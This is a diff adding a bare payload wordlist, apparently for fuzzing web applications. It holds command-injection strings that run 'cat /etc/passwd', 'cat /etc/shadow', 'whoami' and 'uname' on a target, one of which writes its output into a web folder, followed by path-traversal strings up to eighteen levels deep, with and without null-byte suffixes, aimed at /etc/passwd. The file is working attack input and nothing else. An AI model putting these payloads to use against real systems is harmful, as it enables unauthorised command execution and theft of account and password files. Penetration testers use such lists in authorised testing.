@@ -1,0 +1,51 @@
+; cat /etc/passwd
+&& cat /etc/shadow || cat /etc/group
+`uname -a`
+${uname -a}}
+| cat /etc/shadow
+'whoami'burp collabator
+'pwd'burp collabator
+'id'burp collabator
+'uname'burp collabator
+; cat /etc/passwd; cat /etc/shadow; cat /etc/group
+|| ping+-c+10 127.0.0.1 || 
+|| whoami> var/www/images/output.txt || 
+
+/etc/passwd
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+../../../../../../../../../etc/passwd
+../../../../../../../../../../etc/passwd
+../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../etc/passwd
+/etc/passwd%00
+../etc/passwd%00
+../../etc/passwd%00
+../../../etc/passwd%00
+../../../../etc/passwd%00
+../../../../../etc/passwd%00
+../../../../../../etc/passwd%00
+../../../../../../../etc/passwd%00
+../../../../../../../../etc/passwd%00
+../../../../../../../../../etc/passwd%00
+../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../../../../../../../../etc/passwd%00
